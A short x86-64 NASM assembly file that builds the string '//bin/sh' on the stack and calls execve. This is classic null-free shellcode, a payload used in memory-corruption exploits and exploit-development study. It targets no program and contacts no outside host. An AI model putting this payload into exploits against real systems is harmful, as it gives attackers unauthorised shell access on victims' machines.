BITS 64

section .text
    global _start

_start:
    xor rax, rax
    push rax                        ; NULL terminator

    mov rbx, "//bin/sh"             ; 8-bytes, loaded as 64 bits 
    push rbx                        ; save "//bin/sh" onto the stack
    mov rdi, rsp                    ; rdi (1st argument) = pointer to "/bin/sh"

    xor rsi, rsi                    ; argv = NULL
    xor rdx, rdx                    ; envp = NULL

    mov al, 0x3b                   ; syscall execve = 59
    syscall